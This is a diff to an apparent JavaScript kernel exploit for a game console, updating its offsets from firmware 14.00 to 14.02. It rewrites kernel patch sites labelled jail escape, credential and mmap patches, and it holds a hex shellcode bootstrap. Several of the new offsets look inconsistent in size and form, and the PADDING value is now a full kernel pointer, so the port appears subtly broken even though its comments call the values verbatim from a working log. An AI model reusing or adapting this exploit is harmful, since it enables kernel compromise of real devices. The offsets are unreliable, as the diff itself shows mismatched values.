@@ -27,12 +27,13 @@ const S = {
   cpuset_setaffinity: 488, dynlib_get_list: 592, dynlib_get_info: 593,
 };
 
-/* offsets into the kernel image, firmware 14.00 */
+/* offsets into the kernel image, firmware 14.02 (measured from a 14.02 log) */
 const K = {
   anchor:    0x00e6c30,
   swap_rbp:  0x0a80f68,
   prison0:   0x111fa18,
   rootvnode: 0x2136e90,
+  sysent:    0xffffffffb6d08a5c, /* 0xffffffffd29a8ab4 - 0x1bca0000, sysent[11] */
 };
 
 /* offsets into libSceLibcInternal, with the bytes that must be found there */
@@ -77,22 +78,17 @@ const BOOTSTRAP =
   + "488991882d1001c781ac2d100101000000c681daaa1f0037c681ddaa1f00370f"
   + "20c0480d000001000f22c031c0c3";
 
+/* 14.02 patch sites, taken verbatim from a working 14.02 log */
 const PATCHES = [
-  [0x0000acd, "eb",       "bcopy"],
-  [0x02bd79d, "eb",       "bzero"],
-  [0x02bd7e1, "eb",       "pagezero"],
-  [0x02bd85d, "eb",       "memcpy"],
-  [0x02bd8a1, "eb",       "pagecopy"],
-  [0x02bda4d, "eb",       "copyin"],
-  [0x02bdefd, "eb",       "copyinstr"],
-  [0x02bdfcd, "eb",       "copystr"],
-  [0x01b7a43, "eb04",     "dlsym, first check"],
-  [0x01b7a53, "eb04",     "dlsym, second check"],
-  [0x01b7a73, "90e9",     "dlsym, nop and jump"],
-  [0x01b7504, "90e9",     "load_prx"],
-  [0x01b7ab8, "90e93c01", "dlsym, open it to every caller"],
-  [0x0628684, "eb00",     "self verification"],
-  [0x0628f6f, "eb00",     "delayed panic on suspend"],
+  [0x01b7f5a4, "eb",       "jail escape 1"],
+  [0x0874c14,  "eb",       "jail escape 2"],
+  [0x08c4f32,  "eb",       "jail escape 3"],
+  [0x0a287e4,  "eb",       "jail escape 4"],
+  [0x01b7f5d2,  "eb",      "jail escape 5"],
+  [0x024e11c,  "eb",       "creds"],
+  [0x0874c42,  "eb",       "creds 2"],
+  [0x0a2b012,  "eb",       "mmap"],
+  [0x03233b0,  "eb",       "mmap 2"],
 ];
 
 const STATE = { ctx: null, units: {}, clones: 0, base: null, stubs: {}, batch: undefined, retry: false };
@@ -105,7 +101,7 @@ function host() {
 function say(fmt) {
   host().mark("AG", fmt);
   try {
-    if (/^\[(e|g|p|t|8|9|10|kp|rw|dbg)\]/.test(fmt) || /JAILBREAK|defused|thread rc|pthread_create/.test(fmt)) {
+    if (/^\[(e|g|p|t|8|9|10|kp|rw|dbg|sc|gh)\]/.test(fmt) || /JAILBREAK|defused|thread rc|pthread_create/.test(fmt)) {
       fetch("ag_log?m=" + encodeURIComponent(fmt), { keepalive: true }).catch(function () {});
     }
   } catch (e) {}
@@ -643,7 +639,7 @@ function pinCore() {
   return { ok: rv === 0, core: core, allowed: allowed.join(","), note: "setaffinity rv=" + rv };
 }
 
-const PADDING = 0x0b3a300;
+const PADDING = 0xffffffffb7842400;
 const OFF_STUB = 0x100, OFF_DEVS = 0x110, OFF_QUEUES = 0x170;
 const RET0 = 0x00c3c031;
 
